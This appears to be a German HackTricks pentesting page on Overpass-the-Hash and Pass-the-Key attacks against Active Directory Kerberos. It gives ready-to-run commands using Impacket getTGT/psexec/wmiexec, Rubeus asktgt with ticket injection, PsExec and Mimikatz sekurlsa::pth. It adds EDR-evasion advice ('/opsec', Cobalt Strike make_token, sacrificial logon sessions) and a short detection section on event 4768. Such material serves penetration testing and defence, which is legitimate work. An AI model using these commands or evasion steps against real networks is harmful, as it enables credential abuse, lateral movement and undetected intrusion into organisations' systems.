# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Der **Overpass The Hash/Pass The Key (PTK)**-Angriff ist für Umgebungen gedacht, in denen das traditionelle NTLM-Protokoll eingeschränkt ist und Kerberos-Authentifizierung Vorrang hat. Dieser Angriff nutzt den NTLM-Hash oder AES-Keys eines Benutzers, um Kerberos-Tickets anzufordern, und ermöglicht so unautorisierten Zugriff auf Ressourcen innerhalb eines Netzwerks.

Genau genommen:

- **Over-Pass-the-Hash** bedeutet normalerweise, den **NT hash** über den **RC4-HMAC**-Kerberos-Key in ein Kerberos-TGT umzuwandeln.
- **Pass-the-Key** ist die allgemeinere Variante, bei der du bereits einen Kerberos-Key wie **AES128/AES256** hast und damit direkt ein TGT anforderst.

Dieser Unterschied ist in gehärteten Umgebungen wichtig: Wenn **RC4 deaktiviert** ist oder vom KDC nicht mehr angenommen wird, reicht der **NT hash allein nicht aus** und du brauchst einen **AES-Key** (oder das Klartextpasswort, um ihn abzuleiten).

Um diesen Angriff auszuführen, besteht der erste Schritt darin, den NTLM-Hash oder das Passwort des Kontos des Zielbenutzers zu beschaffen. Sobald diese Information vorliegt, kann ein Ticket Granting Ticket (TGT) für das Konto erhalten werden, wodurch der Angreifer auf Dienste oder Maschinen zugreifen kann, für die der Benutzer Berechtigungen hat.

Der Prozess kann mit den folgenden Befehlen gestartet werden:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Für Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES key]` verwendet werden:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` unterstützt außerdem das Anfordern eines **Service Tickets direkt über einen AS-REQ** mit `-service <SPN>`, was nützlich sein kann, wenn du ein Ticket für ein bestimmtes SPN ohne einen zusätzlichen TGS-REQ möchtest:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Darüber hinaus könnte das erlangte Ticket mit verschiedenen Tools verwendet werden, einschließlich `smbexec.py` oder `wmiexec.py`, wodurch der Umfang des Angriffs erweitert wird.

Probleme wie _PyAsn1Error_ oder _KDC cannot find the name_ werden typischerweise durch ein Update der Impacket-Library oder durch die Verwendung des Hostnamens statt der IP-Adresse behoben, um die Kompatibilität mit dem Kerberos KDC sicherzustellen.

Eine alternative Befehlssequenz mit Rubeus.exe demonstriert einen weiteren Aspekt dieser Technik:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Diese Methode spiegelt den **Pass the Key**-Ansatz wider, mit dem Schwerpunkt darauf, das Ticket direkt zu übernehmen und für Authentifizierungszwecke zu nutzen. In der Praxis:

- `Rubeus asktgt` sendet die **raw Kerberos AS-REQ/AS-REP** selbst und benötigt **keine** Admin-Rechte, es sei denn, du möchtest mit `/luid` eine andere Logon-Session ansprechen oder mit `/createnetonly` eine separate erstellen.
- `mimikatz sekurlsa::pth` patched Credential-Material in eine Logon-Session und **berührt daher LSASS**, was in der Regel lokale Admin-Rechte oder `SYSTEM` erfordert und aus EDR-Sicht auffälliger ist.

Beispiele mit Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Um den operational security zu entsprechen und AES256 zu verwenden, kann der folgende Befehl angewendet werden:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` ist relevant, weil von Rubeus erzeugter Traffic sich leicht von nativen Windows Kerberos unterscheidet. Beachte auch, dass `/opsec` für **AES256**-Traffic gedacht ist; bei Verwendung mit RC4 ist meist `/force` erforderlich, was den Zweck größtenteils aufhebt, weil **RC4 in modernen Domains selbst ein starkes Signal** ist.

## Detection notes

Jede TGT-Anfrage erzeugt **event `4768`** auf dem DC. In aktuellen Windows-Builds enthält dieses Event mehr nützliche Felder, als ältere Beschreibungen erwähnen:

- `TicketEncryptionType` sagt dir, welcher enctype für das ausgestellte TGT verwendet wurde. Typische Werte sind `0x17` für **RC4-HMAC**, `0x11` für **AES128** und `0x12` für **AES256**.
- Aktualisierte Events zeigen außerdem `SessionKeyEncryptionType`, `PreAuthEncryptionType` und die vom Client angekündigten enctypes, was hilft, **echte RC4-Abhängigkeit** von verwirrenden Legacy-Defaults zu unterscheiden.
- `0x17` in einer modernen Umgebung zu sehen, ist ein guter Hinweis darauf, dass das Konto, der Host oder der KDC-Fallback-Pfad RC4 noch zulässt und daher für NT-hash-basiertes Over-Pass-the-Hash besser geeignet ist.

Microsoft hat das RC4-by-default-Verhalten seit den Kerberos-Hardening-Updates vom November 2022 schrittweise reduziert, und die aktuell veröffentlichte Empfehlung lautet, **RC4 als standardmäßig angenommenen enctype für AD DCs bis Ende Q2 2026 zu entfernen**. Aus offensiver Sicht bedeutet das, dass **Pass-the-Key mit AES** zunehmend der zuverlässige Weg ist, während klassisches **NT-hash-only OpTH** in gehärteten Umgebungen immer häufiger fehlschlägt.

Für weitere Details zu Kerberos-Verschlüsselungstypen und verwandtem Ticketing-Verhalten siehe:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Jede Logon Session kann nur ein aktives TGT gleichzeitig haben, also sei vorsichtig.

1. Erstelle mit **`make_token`** von Cobalt Strike eine neue Logon Session.
2. Nutze dann Rubeus, um ein TGT für die neue Logon Session zu erzeugen, ohne die bestehende zu beeinflussen.

Eine ähnliche Isolation kannst du direkt mit Rubeus über eine opfernde **logon type 9** Session erreichen:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Dies vermeidet das Überschreiben des aktuellen Session-TGT und ist in der Regel sicherer, als das Ticket in deine bestehende Logon-Session zu importieren.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
